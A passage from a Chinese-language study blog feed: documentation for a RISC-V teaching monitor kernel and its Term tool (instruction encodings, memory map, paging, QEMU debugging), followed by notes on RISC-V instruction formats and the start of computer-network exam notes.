class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y sim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而不是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y<span class="token function">make</span> sim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>目前所有可能出现的开关有: </p><ol><li><code>EN_INT</code>: 打开中断、异常和用户态支持, 默认关闭. </li><li><code>EN_PAGING</code>: 打开页表支持, 要求 <code>EN_INT</code> 已打开, 默认关闭. </li><li><code>EN_FENCEI</code>: 如果实现了 L1 Cache 并且分离了 I Cache 和 D Cache 则应当开启, 在写入代码后执行 <code>FENCE.I</code> 指令, 默认关闭. </li><li><code>EN_UART16550</code>: 如果实现了 UART 16550 兼容的串口控制器则要开启, 否则可以关闭, 默认开启. </li></ol><p>若要在硬件上运行, 使用开发板提供的工具, 将 <code>kernel.bin</code> 写入内存 0x80000000 地址位置, 并让处理器复位从 0x80000000 地址处开始执行, Kernel 就运行起来了. </p><p>Kernel 运行后会先通过串口输出版本号, 该功能可作为检验其正常运行的标志. 之后 Kernel 将等待 Term 从串口发来的命令, 关于 Term 的使用将在后续章节描述.  </p><h3 id="基础版本"><a href="#基础版本" class="headerlink" title="基础版本"></a>基础版本</h3><p>基础版本的 Kernel 共使用了 19 条不同的指令, 它们是: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">ADD   0000000SSSSSsssss000ddddd0110011ADDI  iiiiiiiiiiiisssss000ddddd0010011AND   0000000SSSSSsssss111ddddd0110011ANDI  iiiiiiiiiiiisssss111ddddd0010011AUIPC iiiiiiiiiiiiiiiiiiiiddddd0010111BEQ   iiiiiiiSSSSSsssss000iiiii1100011BNE   iiiiiiiSSSSSsssss001iiiii1100011JAL   iiiiiiiiiiiiiiiiiiiiddddd1101111JALR  iiiiiiiiiiiisssss000ddddd1100111LB    iiiiiiiiiiiisssss000ddddd0000011LUI   iiiiiiiiiiiiiiiiiiiiddddd0110111LW    iiiiiiiiiiiisssss010ddddd0000011OR    0000000SSSSSsssss110ddddd0110011ORI   iiiiiiiiiiiisssss110ddddd0010011SB    iiiiiiiSSSSSsssss000iiiii0100011SLLI  0000000iiiiisssss001ddddd0010011SRLI  0000000iiiiisssss101ddddd0010011SW    iiiiiiiSSSSSsssss010iiiii0100011XOR   0000000SSSSSsssss100ddddd0110011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果实现的是 RISC-V 64 位, 则额外需要实现以下指令: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">ADDIW iiiiiiiiiiiisssss000ddddd0011011LD    iiiiiiiiiiiisssss011ddddd0000011SD    iiiiiiiSSSSSsssss011iiiii0100011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在以上指令里面, 很多指令的功能是相近的, 分类以后, 实际上只需要实现如下的几种指令, 然后很容易就可以扩展到其它指令:</p><pre class="line-numbers language-none"><code class="language-none">ADD: ADDI, AND, ANDI, OR, ORI, SLLI, SRLI, XOR, ADDIWAUIPC:BEQ: BNEJAL:JALR:LB: LW, LDLUI:SB: SW, SD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际上只需要实现上面的八条指令, 简单扩展即可实现需要的所有指令. 根据 RISC-V 规范正确实现这些指令后, 程序才能正常工作. </p><p>监控程序使用了 8 MB 的内存空间, 其中约 1 MB 由 Kernel 使用, 剩下的空间留给用户程序. 此外, 为了支持串口通信, 还设置了一个内存以外的地址区域, 用于串口收发. 具体内存地址的分配方法如下表所示: </p><div class="table-container"><table><thead><tr><th>地址区间</th><th>说明</th></tr></thead><tbody><tr><td>0x80000000-0x800FFFFF</td><td>监控程序代码</td></tr><tr><td>0x80100000-0x803FFFFF</td><td>用户程序代码</td></tr><tr><td>0x80400000-0x807EFFFF</td><td>用户程序数据</td></tr><tr><td>0x807F0000-0x807FFFFF</td><td>监控程序数据</td></tr><tr><td>0x10000000-0x10000007</td><td>串口数据及状态</td></tr></tbody></table></div><p>串口控制器按照 <a href="https://www.lammertbies.nl/comm/info/serial-uart">16550 UART 的寄存器</a> 的子集实现, 访问的代码位于 <code>kern/utils.S</code> , 其部分数据格式为:</p><div class="table-container"><table><thead><tr><th>地址</th><th>位</th><th>说明</th></tr></thead><tbody><tr><td>0x10000000</td><td>[7:0]</td><td>串口数据, 读、写地址分别表示串口接收、发送一个字节</td></tr><tr><td>0x10000005</td><td>[5]</td><td>只读, 为 1 时表示串口空闲, 可发送数据</td></tr><tr><td>0x10000005</td><td>[0]</td><td>只读, 为 1 时表示串口收到数据</td></tr></tbody></table></div><p>默认情况下还会按照 UART 16550 的初始化流程进行一些寄存器的配置. 在 QEMU 中运行的时候, 请保持 <code>EN_UART16550=y</code> 默认行为. 如果采用自定义的实现, 请设置 <code>EN_UART16550=n</code> 以去掉这些寄存器操作, 或者忽略掉这些操作 (但初始化时仍会输出额外字符, 因为 RBR THR 和 DLL 在同一个地址). 如果使用了 AXI UART16550 作为串口控制器, 请参考代码注释并修改 <code>kernel/include/serial.h</code> 中的常量, 并设置 <code>EN_UART16550=y</code>. </p><p>Kernel 的入口地址为 0x80000000, 对应汇编代码 <code>kern/init.S</code> 中的 <code>START:</code> 标签. 在完成必要的初始化流程后, Kernel 输出版本信息, 随后进入 shell 线程, 与用户交互. shell 线程会等待串口输入, 执行输入的命令, 并通过串口返回结果, 如此往复运行. </p><p>当收到启动用户程序的命令后, 用户线程代替 shell 线程的活动. 用户程序的寄存器, 保存在从 0x807F0000 开始的连续 <code>31*XLEN</code> 字节中, 依次对应 x1 到 x31 用户寄存器, 每次启动用户程序时从上述地址装载寄存器值, 用户程序运行结束后保存到上述地址. </p><h3 id="进阶一-中断和异常支持"><a href="#进阶一-中断和异常支持" class="headerlink" title="进阶一: 中断和异常支持"></a>进阶一: 中断和异常支持</h3><p>作为扩展功能之一, Kernel 支持中断方式的 I/O, 和 Syscall 功能. 要启用这一功能, 编译时的命令变为: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一编译选项, 会使得代码编译时增加宏定义 <code>ENABLE_INT</code> , 从而使能中断相关的代码. 为支持中断, CPU 要额外实现以下指令</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">CSRRC  ccccccccccccsssss011ddddd1110011CSRRS  ccccccccccccsssss010ddddd1110011CSRRW  ccccccccccccsssss001ddddd1110011EBREAK 00000000000100000000000001110011ECALL  00000000000000000000000001110011MRET   00110000001000000000000001110011SLTU   0000000SSSSSsssss011ddddd0110011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此外还需要实现 CSR 寄存器的这些字段: </p><ol><li><code>mtvec</code>: BASE, MODE</li><li><code>mscratch</code></li><li><code>mepc</code></li><li><code>mcause</code>: Interrupt, Exception Code</li><li><code>mstatus</code>: MPP</li><li><code>mie</code>: MTIE</li><li><code>mip</code>: MTIP</li></ol><p>CSR 寄存器字段功能定义见 RISC-V 特权态规范. 监控程序对于异常、中断的使用方式如下: </p><ul><li>入口函数 <code>EXCEPTION_HANDLER</code>, 根据异常号跳转至相应的异常处理程序. </li><li>初始化时设置 <code>mtvec = EXCEPTION_HANDLER</code>, 使用正常中断模式 (<code>MODE = DIRECT</code>); 如果不支持 <code>MODE = DIRECT</code> (利用 <code>mtvec</code> 的 <code>WARL</code> 判断), 则会使用向量中断模式 (<code>MODE = VECTORED</code>). </li><li>用户程序在 U-mode 中运行 (<code>mret</code> 时 <code>mstatus.MPP = 0</code>), 通过 <code>ebreak</code> 回到 M-mode, 在异常处理中跳回到 SHELL. </li><li>异常帧保存 31 个通用寄存器及 <code>mepc</code> 寄存器. </li><li>禁止发生嵌套异常. </li><li>支持 <code>SYS_putc</code> 系统调用, 调用方法参考 <code>UTEST_PUTC</code> 函数. 写串口忙等待, 与禁止嵌套异常不冲突. </li><li>当发生不能处理的中断时, 表示出现严重错误, 终止当前任务, 自行重启. 并且发送错误信号 0x80 提醒 Term. </li></ul><p>为了支持时钟中断, 还需要实现 CLINT 设备的两个 MMIO 寄存器: </p><div class="table-container"><table><thead><tr><th>地址</th><th>说明</th></tr></thead><tbody><tr><td>0x200BFF8</td><td>mtime, 64 位, 可读写. 表示当前时间</td></tr><tr><td>0x2004000</td><td>mtimecmp, 64 位, 可读写. 表示下次时钟中断时间</td></tr></tbody></table></div><p>在 CLINT 设备的实现中, 需要每隔固定时间将 <code>mtime</code> 的值 +1, 并且当 <code>mtime &gt;= mtimecmp</code> 时拉高时钟中断信号, 然后 CPU 核心将 <code>mip.MTIP</code> 置 1. 当 <code>mip.MTIP</code>, <code>mie.MTIE</code> 同时为 1, 且当前特权态下全局中断启用时, CPU 即触发时钟中断. </p><p>具体参见 RISC-V 特权态手册 <em>3.1.10 Machine Timer Registers (mtime and mtimecmp)</em>. 有了时钟中断以后, Kernel 就可以杀掉运行超时的用户程序. </p><h3 id="进阶二-页表支持"><a href="#进阶二-页表支持" class="headerlink" title="进阶二: 页表支持"></a>进阶二: 页表支持</h3><p>在支持异常处理的基础上, 可以进一步使能页表支持, 从而实现用户态地址映射. 要启用这一功能, 编译时的命令变为: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_INT</span><span class="token operator">=</span>y <span class="token assign-left variable">EN_PAGING</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CPU 需要额外实现以下指令</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">SFENCE.VMA  0001001SSSSSsssss000000001110011<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有实现 TLB, 可把 <code>SFENCE.VMA</code> 实现为 NOP. 此外还需要实现 csr 寄存器: </p><ol><li><code>satp</code>: MODE, PPN</li></ol><p>以及页表相关的几个异常, RV32 需要实现 Sv32 的页表格式, RV64 需要实现 Sv39 的页表格式. 为了简化, 实际的映射是线性映射, Sv32 映射的方式在下面给出: </p><ul><li>`va[0x00000000, 0x002FFFFF] = pa[0x80100000, 0x803FFFFF] DAGUX-RV 用户态代码</li><li>va[0x7FC10000, 0x7FFFFFFF] = pa[0x80400000, 0x807EFFFF] DAGU-WRV 用户态数据</li><li>va[0x80000000, 0x80000FFF] = pa[0x80000000, 0x80000FFF] DAGUX-RV 用于返回内核态</li><li>va[0x80001000, 0x80001FFF] = pa[0x80001000, 0x80001FFF] DAGUX-RV 用于运行 UTEST 程序 (CRYPTONIGHT 除外)</li><li>va[0x80100000, 0x80100FFF] = pa[0x80100000, 0x80100FFF] DAGUX-RV 方便测试</li></ul><p>Sv39 下为了实现的方便, 映射的地址比以上的地址区域更大一些: </p><ul><li>va[0x00000000, 0x002FFFFF] = pa[0x80100000, 0x803FFFFF] DAGUX-RV 用户态代码</li><li>va[0x7FC10000, 0x7FFFFFFF] = pa[0x80400000, 0x807EFFFF] DAGU-WRV 用户态数据</li><li>va[0x80000000, 0x801FFFFF] = pa[0x80000000, 0x801FFFFF] DAGUX-RV 用于返回内核态、运行 UTEST 程序和方便测试</li></ul><p>其它地址都未经映射, 访问则会引发异常. </p><p>初始化过程: </p><ol><li>根据 RV32 还是 RV64 选择 Sv32 或者 Sv39 的页表进行填写</li><li>将页表的物理地址写入 <code>satp</code> 并配置好模式, 启用 U-mode 下的页表映射机制. </li><li>通过 <code>sfence.vma</code> 指令刷新 TLB. </li><li>将用户栈指针设为 0x80000000. </li></ol><h2 id="Term"><a href="#Term" class="headerlink" title="Term"></a>Term</h2><p>Term 程序运行在实验者电脑上, 提供监控程序交互界面. Term 支持以下命令: </p><ul><li><code>R</code>: 按照 x1 至 x31 的顺序返回用户程序寄存器值. </li><li><code>D</code>: 显示从指定地址开始的一段内存区域中的数据. </li><li><code>A</code>: 用户输入汇编指令, 并放置到指定地址上. </li><li><code>F</code>: 从文件读入汇编指令并放置到指定地址上, 格式与 A 命令相同. </li><li><code>U</code>: 从指定地址读取一定长度的数据, 并显示反汇编结果. </li><li><code>G</code>: 执行指定地址的用户程序. </li><li><code>T</code>: 查看页表内容, 仅在启用页表时有效. </li><li><code>Q</code>: 退出 Term. </li></ul><p>利用这些命令, 实验者可以输入一段汇编程序, 检查数据是否正确写入, 并让程序在处理器上运行验证. Term 程序位于 <code>term</code> 文件夹中, 可执行文件为 <code>term.py</code> . 对于本地的 Thinpad, 运行程序时用 <code>-s</code> 选项指定串口. 例如: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-s</span> COM3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-s</span> /dev/ttyACM0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接远程实验平台 Thinpad 或 QEMU 模拟器时, 使用 -t 选项指定 IP 和端口. 如: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python term.py <span class="token parameter variable">-t</span> <span class="token number">127.0</span>.0.1:6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>监控程序附带了几个测试程序, 代码见 <code>kern/test.S</code> . 可以通过命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">EN_XXX</span><span class="token operator">=</span>y show-utest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来查看测试程序入口地址. 记下这些地址, 并在 Term 中使用 <code>G</code> 命令运行它们. </p><ul><li><p><code>CRYPTONIGHT</code> 测试模仿了 CryptoNight 算法, 它会进行很多次的随机访存, 数据缓存命中率会很低. 运行结束后, 寄存器 <code>t0</code> 保存的是最终结果, 32 位下应该是 <code>a2e31a85</code>, 64 位下应该是 <code>ffffffff861c65d4</code>. </p></li><li><p><code>SPIN</code> 测试是一个死循环, 用来测试时钟中断能否正确杀掉超时程序. </p></li></ul><h3 id="用户程序编写"><a href="#用户程序编写" class="headerlink" title="用户程序编写"></a>用户程序编写</h3><p>根据监控程序设计, 用户程序的代码区为 0x80100000-0x803FFFFF, 实验时需要把用户程序写入这一区域. 用户程序的最后需要以 <code>jr ra</code> 结束, 保证正确返回监控程序. </p><p>在输入用户程序的过程中, 可以用汇编指令, 可以直接写 16 进制的机器码, 还可以写 label (见以下例子中 <code>loop:</code>). 以下是一次输入用户程序并运行的过程演示: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">connecting to 127.0.0.1:6666...connectedrunning in 32bit, xlen = 4&gt;&gt; aaddr: 0x80100000one instruction per line, empty line to end.[0x80100000] li a0, 5[0x80100004] li t0, 0[0x80100008] 00000313[0x8010000c] loop:[0x8010000c] add t1, t1, t0[0x80100010] addi t0, t0, 1[0x80100014] bne a0, t0, loop[0x80100018] jr ra[0x8010001c]&gt;&gt; uaddr: 0x80100000num: 320x80100000:00500513lia0,50x80100004: 00000293lit0,00x80100008: 00000313lit1,00x8010000c: 00530333addt1,t1,t00x80100010: 00128293addit0,t0,10x80100014: fe551ce3bnea0,t0,0x8010000c0x80100018: 00008067ret0x8010001c: 00000000...&gt;&gt; gaddr: 0x80100000elapsed time: 0.000s&gt;&gt; rR1 (ra)    = 0x80000414R2 (sp)    = 0x807fff00R3 (gp)    = 0x00000000R4 (tp)    = 0x00000000R5 (t0)    = 0x00000005R6 (t1)    = 0x0000000aR7 (t2)    = 0x00000000R8 (s0/fp) = 0x80000000R9 (s1)    = 0x00000000R10(a0)    = 0x00000005R11(a1)    = 0x00000000R12(a2)    = 0x00000000R13(a3)    = 0x00000000R14(a4)    = 0x00000000R15(a5)    = 0x00000000R16(a6)    = 0x00000000R17(a7)    = 0x00000000R18(s2)    = 0x00000000R19(s3)    = 0x00000000R20(s4)    = 0x00000000R21(s5)    = 0x00000000R22(s6)    = 0x00000000R23(s7)    = 0x00000000R24(s8)    = 0x00000000R25(s9)    = 0x00000000R26(s10)   = 0x80100000R27(s11)   = 0x00000000R28(t3)    = 0x00000000R29(t4)    = 0x00000000R30(t5)    = 0x00000000R31(t6)    = 0x00000000&gt;&gt; q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当处理器和 Kernel 支持异常功能时 (即上文所述 <code>EN_INT=y</code>), 用户还可以用 Syscall 的方式打印字符. 打印字符的系统调用号为 30. 使用时, 用户把调用号保存在 s0 寄存器, 打印字符参数保存在 a0 寄存器, 并执行 syscall 指令, a0 寄存器的低八位将作为字符打印. 例如: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">li s0, 30           # 系统调用号li a0, 0x4F         # 'O'ecallli a0, 0x4B         # 'K'ecalljr ra<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 <code>A</code> 命令输入的汇编指令支持常见的伪指令 (pseudo instructions), 并且地址也会相应地变化, 如:</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">connecting to 127.0.0.1:6666...connectedrunning in 32bit, xlen = 4&gt;&gt; Aaddr: 0x80100000one instruction per line, empty line to end.[0x80100000] li a0, 0x12345678[0x80100008] li t0, 0x23333332[0x80100010] ret[0x80100014]&gt;&gt; Uaddr: 0x80100000num: 200x80100000:     12345537        lui     a0,0x123450x80100004:     67850513        addi    a0,a0,16560x80100008:     233332b7        lui     t0,0x233330x8010000c:     33228293        addi    t0,t0,8180x80100010:     00008067        ret&gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是 RV64, 上面的 <code>addi</code> 指令会相应地变成 <code>addiw</code> 指令. </p><h2 id="在-QEMU-里调试监控程序"><a href="#在-QEMU-里调试监控程序" class="headerlink" title="在 QEMU 里调试监控程序"></a>在 QEMU 里调试监控程序</h2><p>在 Makefile 中提供了 <code>debug</code> 目标, 它会编译 kernel 并且运行 QEMU: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> kernel$ <span class="token function">make</span> debugqemu-system-riscv32 <span class="token parameter variable">-M</span> virt <span class="token parameter variable">-m</span> 32M <span class="token parameter variable">-kernel</span> kernel.elf <span class="token parameter variable">-nographic</span> <span class="token parameter variable">-monitor</span> stdio <span class="token parameter variable">-serial</span> tcp::6666,server <span class="token parameter variable">-S</span> <span class="token parameter variable">-s</span>QEMU <span class="token number">5.0</span>.0 monitor - <span class="token builtin class-name">type</span> <span class="token string">'help'</span> <span class="token keyword">for</span> <span class="token function">more</span> information<span class="token punctuation">(</span>qemu<span class="token punctuation">)</span> qemu-system-riscv32: <span class="token parameter variable">-serial</span> tcp::6666,server: info: QEMU waiting <span class="token keyword">for</span> connection on: disconnected:tcp::::6666,server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后它会在 6666 端口上等待 term 的连接. 另起一个窗口, 运行 term 连接到 <code>localhost:6666</code>: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python3 term/term.py <span class="token parameter variable">-t</span> <span class="token number">127.0</span>.0.1:6666 <span class="token parameter variable">-c</span>connecting to <span class="token number">127.0</span>.0.1:6666<span class="token punctuation">..</span>.connected<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这一步连上以后, 就可以用 gdb 挂载到 qemu 里的 kernel 上了. 采用<strong>比较新</strong>的 gdb 或者 SiFive 的 riscv64-elf-unknown-gdb (Windows 最好用这个) 都是可以的. 命令: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ riscv64-unknown-elf-gdb kernel/kernel.elfGNU gdb <span class="token punctuation">(</span>SiFive GDB <span class="token number">8.3</span>.0-2019.08.0<span class="token punctuation">)</span> <span class="token number">8.3</span>Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2019</span> Free Software Foundation, Inc.License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">&gt;</span>This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type <span class="token string">"show copying"</span> and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.This GDB was configured as <span class="token string">"--host=x86_64-w64-mingw32 --target=riscv64-unknown-elf"</span><span class="token builtin class-name">.</span>Type <span class="token string">"show configuration"</span> <span class="token keyword">for</span> configuration details.For bug reporting instructions, please see:<span class="token operator">&lt;</span>https://github.com/sifive/freedom-tools/issues<span class="token operator">&gt;</span>.Find the GDB manual and other documentation resources online at:    <span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/documentation/<span class="token operator">&gt;</span>.For help, <span class="token builtin class-name">type</span> <span class="token string">"help"</span><span class="token builtin class-name">.</span>Type <span class="token string">"apropos word"</span> to search <span class="token keyword">for</span> commands related to <span class="token string">"word"</span><span class="token punctuation">..</span>.Reading symbols from kernel/kernel.elf<span class="token punctuation">..</span>.<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> target remote localhost:1234Remote debugging using localhost:12340x00001000 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后就可以正常进行调试. </p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>CPU 采用的 RISC-V 指令集标准: The RISC-V Instruction Set Manual Volume I: User-Level ISA Document</li><li>RISC-V 中断及 Sv32/Sv39 等特权态资源: The RISC-V Instruction Set Manual Volume II: Privileged Architecture</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> COD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记1</title>
      <link href="/2023/09/19/ji-suan-ji-zhi-ling-xi-tong/"/>
      <url>/2023/09/19/ji-suan-ji-zhi-ling-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h1><h2 id="Risc-V-指令"><a href="#Risc-V-指令" class="headerlink" title="Risc-V 指令"></a>Risc-V 指令</h2><h3 id="U-型"><a href="#U-型" class="headerlink" title="U 型"></a>U 型</h3><p><img src="/pic/173.png" alt=""></p><p><img src="/pic/174.png" alt=""></p><ul><li><strong>lui</strong> 和 <strong>auipc</strong> 主要用于构造大的常量数值和链接.</li><li><strong>lui</strong> 设置寄存器高位立即数, 用两条指令便可以任意偏移量转移控制流或者加载任意 32 位数据.<ul><li>将 <strong>lui</strong> 中的 20 位立即数与 <strong>jalr</strong> 中 12 位立即数组合, 可以将执行流转移到任何 32 位绝对地址.</li><li><strong>lui</strong> 加上标准的立即指令, 可构造一个任意 32 位常量.</li></ul></li><li><strong>auipc</strong> 向 PC 高位加上立即数, 仅用两条指令便可以基于当前 PC 以任意偏移量转移控制流或者访问数据.<ul><li>将 <strong>auipc</strong> 中的 20 位立即数与 <strong>jalr</strong> 中 12 位立即数组合, 可以将执行流转移到任何 32 位 PC 相对地址.</li><li><strong>auipc</strong> 加上普通加载或存储指令中的 12 位立即数偏移量, 可以访问任何 32 位 PC 相对地址的数据.</li></ul></li></ul><h3 id="UJ-J-型"><a href="#UJ-J-型" class="headerlink" title="UJ/J 型"></a>UJ/J 型</h3><p><img src="/pic/175.png" alt=""></p><ul><li><strong>J</strong> 类型的直接字段在 <strong>U</strong> 类型的基础上旋转了 12 位. 这可以降低指令信号扇出和立即数多路复用的成本, 并简化低端实现中的数据通路逻辑.</li><li>由于指令长度必须是两个字节的倍数, <strong>J</strong> 格式的分支和跳转地址必须向左移动 1 位以将地址乘以 2, 给予分支和跳转指令更大的跳转范围, 进行符号扩展后再添加到 PC 上, 得到跳转地址.</li><li><strong>jal</strong> 具有双重功能. 若将下一条指令 PC + 4 的地址保存到目标寄存器中.<ul><li>通常是返回地址寄存器 ra, 便可实现过程调用.</li><li>使用零寄存器 x0 替换 ra 作为目标寄存器, 则可实现无条件跳转. </li></ul></li></ul><h3 id="I-型-1"><a href="#I-型-1" class="headerlink" title="I 型 - 1"></a>I 型 - 1</h3><p><img src="/pic/176.png" alt=""></p><ul><li>跳转链接指令的寄存器版本 <strong>jalr</strong> 同样是多用途的.<ul><li>可以调用地址是动态计算出来的函数.</li><li>可以实现调用返回 (ra 作为源寄存器, x0 作为目的寄存器).</li><li>switch 和 case 语句的地址跳转也可使用 <strong>jalr</strong> 指令, 目的寄存器设为 x0.</li></ul></li></ul><p><img src="/pic/177.png" alt=""></p><p><img src="/pic/178.png" alt=""></p><h3 id="I-型-2"><a href="#I-型-2" class="headerlink" title="I 型 - 2"></a>I 型 - 2</h3><p><img src="/pic/179.png" alt=""></p><p><img src="/pic/180.png" alt=""></p><p><img src="/pic/181.png" alt=""></p><p><img src="/pic/182.png" alt=""></p><p><img src="/pic/183.png" alt=""></p><ul><li><strong>slli</strong> 和 <strong>srli</strong> 的 shamt[4:0] 为移动量, 范围都是[4:0], 因为在 RV32I 中最大的移位量是 31 位.</li><li>imm[10] 用来区分移位类型, 其中 <strong>slli</strong> 和 <strong>srli</strong> 指令机器码的 bit 30 为 0, 而 <strong>srai</strong> 指令机器码的 bit 30 为 1.</li></ul><h3 id="R-型"><a href="#R-型" class="headerlink" title="R 型"></a>R 型</h3><p><img src="/pic/184.png" alt=""></p><p><img src="/pic/185.png" alt=""></p><p><img src="/pic/186.png" alt=""></p><p><img src="/pic/187.png" alt=""></p><h3 id="S-型"><a href="#S-型" class="headerlink" title="S 型"></a>S 型</h3><p><img src="/pic/188.png" alt=""></p><p><img src="/pic/189.png" alt=""></p><h3 id="SB-B-型"><a href="#SB-B-型" class="headerlink" title="SB/B 型"></a>SB/B 型</h3><p><img src="/pic/190.png" alt=""></p><p><img src="/pic/191.png" alt=""></p><ul><li><strong>B</strong> 类型的立即数字段在 <strong>S</strong> 类型的基础上旋转了 1 位. 这可以降低指令信号扇出和立即数多路复用的成本, 并简化低端实现中的数据通路逻辑.</li><li>由于指令长度必须是两个字节的倍数, <strong>B</strong> 格式的分支和跳转地址必须向左移动 1 位以将地址乘以 2, 给予分支和跳转指令更大的跳转范围, 进行符号扩展后再添加到 PC 上, 得到跳转地址.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> COD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络原理 期末复习</title>
      <link href="/2023/06/13/ji-suan-ji-wang-luo-yuan-li-qi-mo-fu-xi/"/>
      <url>/2023/06/13/ji-suan-ji-wang-luo-yuan-li-qi-mo-fu-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Computer-Network-Final-Notes"><a href="#Computer-Network-Final-Notes" class="headerlink" title="Computer Network Final Notes"></a>Computer Network Final Notes</h1><blockquote><p><em>Some useful (maybe) facts are first shown.</em></p></blockquote><ul><li><p><strong>Protocal Stack</strong></p>  <div align="center"><img src="/pic/136.png" width="100%" height="100%"></div></li><li><p><strong>Turing Award</strong></p><ul><li><strong>Bob Metcalfe</strong>: Father of Ethernet</li><li><strong>Vinton G. Cerf &amp; Robert E. Kahn</strong>: TCP/IP</li><li><strong>Tim Berners-Lee</strong>: Web &amp; HTTP</li></ul></li></ul><blockquote><p><em>Now comes the crazy things!</em></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Connect-end-systems-to-edge-router"><a href="#Connect-end-systems-to-edge-router" class="headerlink" title="Connect end systems to edge router"></a>Connect end systems to edge router</h3><ul><li><strong>Residential</strong> access networks</li><li><strong>Institutional</strong> access networks (school, company)</li><li><strong>Mobile</strong> access networks (WiFi, 4G/5G)<ul><li><strong>Wireless local</strong> area networks<ul><li>802.11 (WiFi)</li></ul></li><li><strong>Wide-area cellular</strong> access networks<ul><li>4G cellular networks</li></ul></li></ul></li></ul><h3 id="Links-physical-media"><a href="#Links-physical-media" class="headerlink" title="Links physical media"></a>Links physical media</h3><ul><li><strong>Twisted pair</strong> (TP)</li><li><strong>Coaxial cable</strong></li><li><strong>Fiber optic cable</strong><ul><li>high-speed operation</li><li><strong>low error 